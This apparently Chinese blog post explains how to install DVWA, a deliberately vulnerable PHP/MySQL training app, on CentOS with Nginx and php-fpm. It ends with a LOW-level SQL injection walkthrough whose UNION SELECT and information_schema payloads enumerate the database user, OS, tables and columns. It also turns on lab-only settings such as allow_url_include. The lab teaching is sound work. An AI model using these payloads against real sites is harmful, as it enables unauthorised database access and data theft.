---
title: DVWA 简介
layout: post
comments: true
language: chinese
category: [linux,network,webserver,mysql]
keywords: linux,security,dvwa
description: DVWA (Damn Vulnerable Web Application) 是用 PHP+MySQL 编写的一套用于漏洞检测和教学的程序，支持多种数据库，包括了 SQL 注入、XSS 等一些常见的安全漏洞。详细的内容可以参考官方网站 [www.dvwa.co.uk](http://www.dvwa.co.uk/)，在此暂时仅介绍其环境的安装方法。
---

DVWA (Damn Vulnerable Web Application) 是用 PHP+MySQL 编写的一套用于漏洞检测和教学的程序，支持多种数据库，包括了 SQL 注入、XSS 等一些常见的安全漏洞。

详细的内容可以参考官方网站 [www.dvwa.co.uk](http://www.dvwa.co.uk/)，在此暂时仅介绍其环境的安装方法。

<!-- more -->

![dvwa logo]({{ site.url }}/images/security/dvwa-logo.jpg "dvwa logo"){: .pull-center }

## Nginx PHP 环境搭建

Nginx 和 Apache 的 PHP 安装是有区别的，其中 Nginx 是以 fastcgi 的方式结合 Nginx 的，而 Apache 是把 php 作为自己的模块来调用。

### 配置 Nginx 环境

假设你已经安装好了 Nginx 环境，其中原 php-fpm 也合并到了 php 官方，那么在 CentOS 7 中，可以通过如下方式安装、启动 php-fpm 。

{% highlight text %}
# yum install php php-fpm                   # 安装PHP以及PHP-FPM
# systemctl start php-fpm                   # 启动服务，默认使用9000
{% endhighlight %}

在 Nginx 的配置文件 /etc/nginx/nginx.conf 中添加如下内容。

{% highlight text %}
server {
    location ~ \.php$ {
        try_files      $uri =404;
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME   $document_root$fastcgi_script_name;
        include        fastcgi_params;
    }
}
{% endhighlight %}

在指定的 Nginx root 目录下添加如下的测试文件。

{% highlight text %}
$ cat foobar.php
<?php
    echo "Hello World! PHP, foobar";
?>

$ curl "http://localhost/foobar.php"     # 进行测试
{% endhighlight %}

如果没有报错则正常。

### 日志设置

Nginx 是一个 web 服务器，因此 Nginx 的 access 日志只有对访问页面的记录，不会有 php 的 error log 信息；而默认的 php-fpm 只会输出 php-fpm 的错误信息，在 php-fpm 的 errors log 里也看不到 php 的 errorlog 。

原因是 php-fpm 的配置文件 /etc/php-fpm.conf 中默认是关闭 worker 进程的错误输出，直接把他们重定向到 /dev/null，所以我们在 nginx 的 error log 和 php-fpm 的 errorlog 都看不到 php 的错误日志。

解决 Nginx 下 php-fpm 不记录 php 错误日志的办法:

{% highlight text %}
### 1. 修改 /etc/php-fpm.conf 中配置，没有则增加
[global]
error_log = log/error_log
[www]
catch_workers_output = yes

### 2. 修改 php.ini 中配置，没有则增加
log_errors = On
error_log = "/var/log/php-fpm/php-error.log"
error_reporting=E_ALL&~E_NOTICE
{% endhighlight %}

### 常见错误

简单列举下常见的问题。

#### error 404

出现 404 的原因比较多，暂时列举几条如下：

1. nginx 传入参数有误。设置配置文件 ```error_log /tmp/error.log debug;``` 然后查找 SCRIPT_FILENAME 确认路径是否正确。

2. 权限问题。可以直接查看 ```ps aux | grep -E '(nginx:|php-fpm:)'``` 对应的用户是否有权限，否则可以修改配置文件 ```/etc/nginx/nginx.conf```、```/etc/php-fpm.conf``` 即可。

#### File not found

表象是，在访问 PHP 时，会提示 ```File not found.```，同时在错误日志中看到如下的日志：

{% highlight text %}
2016/02/03 22:29:23 [error] 11716#0: *1 FastCGI sent in stderr: "Primary script unknown"
while reading response header from upstream, client: 127.0.0.1, server: localhost,
request: "GET /index.php HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost"
{% endhighlight %}

简单来说，就是 Nginx 配置文件中没有找到所定义的脚本文件。

{% highlight text %}
root   /usr/local/nginx/html;
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
{% endhighlight %}

上面配置中的 ```$document_root``` 就是 php 文件所对应的目录。

#### Session Permission denied

查看 Nginx 的错误日志，会发现如下内容。

{% highlight text %}
2016/02/03 22:36:25 [error] 18270#0: *57 FastCGI sent in stderr: "PHP message: PHP Warning:
session_start(): open(/var/lib/php/session/sess_5oh2t2mv66ce63kt4i31fcjq15, O_RDWR) "
failed: Permission denied (13) in /webserver/root/DVWA-1.9/dvwa/includes/dvwaPage.inc.php on line 8
{% endhighlight %}

这是因为存放 session 文件的目录没有开放写权限给相应的用户，此时需要在 php 的配置文件 php.ini 里的 session.save_path 设置到临时目录即可，例如：```session.save_path="/tmp/php5"。

当然，也可以在 ```/etc/php-fpm.d/www.conf``` 设置 ```php_value[session.save_path] = /tmp/php5``` 。


## 配置 DVWA

结下来看看如何配置 MySQL 后台的程序。

### 设置 MySQL 环境

对于 DVWA 来说，是需要连接到 MySQL 数据库，假设已经安装配置好了 MySQL 数据库，那么此时在使用前还需要安装 php-mysql 模块。

{% highlight text %}
# yum install php-mysql
{% endhighlight %}

为了测试是否正常，可以在上面定义的 Nginx 目录下添加如下的测试文件。

{% highlight php %}
<?php
    $conn=mysql_connect("127.1", "root", "your_password") or die("connect failed". mysql_error());
    $result=mysql_db_query("mysql", "SELECT host, user FROM user", $conn);
    $row=mysql_fetch_row($result);    // 获取查询结果

    echo '<font face="verdana">';
    echo '<table border="1" cellpadding="1" cellspacing="2">';
    // 显示字段名称
    echo "</b><tr></b>";
    for ($i=0; $i<mysql_num_fields($result); $i++)
    {
      echo '<td bgcolor="#000F00"><b>'.
      mysql_field_name($result, $i);
      echo "</b></td></b>";
    }
    echo "</tr></b>";
    // 定位到第一条记录
    mysql_data_seek($result, 0);
    // 循环取出记录
    while ($row=mysql_fetch_row($result))
    {
      echo "<tr></b>";
      for ($i=0; $i<mysql_num_fields($result); $i++ )
      {
        echo '<td bgcolor="#00FF00">';
        echo $row[$i];
        echo '</td>';
      }
      echo "</tr></b>";
    }

    echo "</table></b>";
    echo "</font>";

    mysql_free_result($result); // 释放资源
    mysql_close($conn);         // 关闭连接
?>
{% endhighlight %}

如果可以正常显示表格，那么继续。


### 配置 DVWA 环境

设置非常简单，按照 nginx-php 环境搭建好之后，通过直接将 nginx 的 root 目录指向 DVWA 的目录，修改 ```config/config.inc.php``` 中的数据库配置即可。

实际上只需要配置链接到 MySQL 的参数，其中包括了 IP 地址、用户名、密码，需要注意的是，对于 MySQL 无法设置端口号。

{% highlight php %}
<?php
... ...
# Database management system to use
$DBMS = 'MySQL';

# Database variables
#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.
#   Please use a database dedicated to DVWA.
$_DVWA = array();
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'new_password';
... ...
?>
{% endhighlight %}

结下来可以直接登陆，登陆的默认密码是 admin/password 。

### 环境配置

简单看下如下的配置。

![dvwa setup check]({{ site.url }}/images/security/dvwa-setup-check.png "dvwa setup check"){: .pull-center }

修改 ```/etc/php.ini``` 配置文件中的 ```allow_url_include=On```。


## SQL 注入

首先在 ```DVWA Security => Security Level``` 中设置，将安全级别设置为 ```LOW``` ，然后在 ```SQL Injection``` 中进行测试；其中 User ID 为 1~5，对应的代码在 ```vulnerabilities/sqli/source``` 中，分别对应了不同的安全等级。

### Low

例如，对于 ```LOW``` 级别，对应的 SQL 代码如下。

{% highlight text %}
SELECT first_name, last_name FROM users WHERE user_id = '$id';
{% endhighlight %}

简单看下常见的 SQL 注入。

{% highlight text %}
----- 正常，1
SELECT first_name, last_name FROM users WHERE user_id = '1';

----- 判断是字符型还是数字型，1' or '1'='1，输出所有列，为字符型
SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1';

----- 查看SQL中查询列数，1' ORDER BY N -- ，N从1递增开始尝试；另外，注意最后有个空格
SELECT first_name, last_name FROM users WHERE user_id = '1' ORDER BY 1 -- ';

----- 确定字段的显示顺序，1' UNION SELECT 1,2 #
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1,2 #;

----- 获取当前用户以及库信息，1' AND 1=2 UNION SELECT user(),database() #
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 UNION SELECT user(),database() #

----- 获取操作系统信息，1' AND 1=2 UNION SELECT 1,@@global.version_compile_os FROM mysql.user #
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 UNION
    SELECT 1,@@global.version_compile_os FROM mysql.user #;

----- 获取库中的表名称，如下仅显示注册的内容
1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #

----- 获取表中的列名称
1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users' #
{% endhighlight %}

<!--
1' and exists(select * from users) -- /*猜解表名
1' and exists(select first_name from users) -- /猜解字段名
1' and 1=2 union select first_name,last_name from users -- /*猜解字段内容'
-->

实际上，在确认了列数之后，就可以通过 ```vesion()```、```database()``` 等函数查看系统信息，也可以执行查询 SQL 语句。


<!--
### Medium

http://blog.csdn.net/qq_32400847/article/details/53697849

import binascii
print binascii.b2a_hex('users')
-->




{% highlight text %}
{% endhighlight %}
